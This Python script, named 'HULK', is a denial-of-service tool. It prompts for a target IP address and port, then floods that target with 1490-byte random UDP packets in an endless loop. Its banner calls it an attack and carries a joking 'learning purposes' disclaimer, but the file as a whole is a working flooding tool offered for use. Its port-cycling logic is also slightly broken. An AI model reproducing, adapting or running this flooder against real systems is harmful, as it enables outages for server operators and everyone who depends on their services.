import random
import socket
import threading
import ipaddress  # Use ipaddress module for IP validation

# Define a function to send packets
def send_packets(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"\n [+] Successfully sent {sent} packet to {ip} through port: {port}")
            if port == 65534:
                port = 1
    except KeyboardInterrupt:
        print("\n [-] Ctrl+C Detected.........Exiting")
        print(" [-] DDOS ATTACK STOPPED")

def main():
    print('''
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: Sumalya Chatterjee          *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author Is Not Responsible For Your Jobs  *
    *  3. Use for learning purposes                * 
    *  4. Does HULK suit in villain role, huh?     *
    ************************************************
    ''')

    ip = input(" [+] Give HULK A Target IP : ")

    try:
        ipaddress.IPv4Address(ip)  # Validate IP address
        print(" ✅ Valid IP Checked.... ")
        print(" [+] Attack Screen Loading ....")
        port = int(input(" [+] Starting Port NO : "))

        print('''
        ************************************************
        *            _  _ _   _ _    _  __             *
        *           | || | | | | |  | |/ /             * 
        *           | __ | |_| | |__| ' <              *
        *           |_||_|\___/|____|_|\_\             *
        *                                              *
        *          HTTP Unbearable Load King           *
        *          Author: Sumalya Chatterjee          *
        *                                              *
        ************************************************
        ''')

        print(" ")
        print("    That's my secret Cap, I am always angry ")
        print(" " )
        print(" [+] HULK is attacking server " + ip )
        print (" " )
        input("Press Enter to start the attack...")

        send_packets(ip, port)

    except ValueError:
        print(" ✘ Input a valid IP address")

if __name__ == "__main__":
    main()
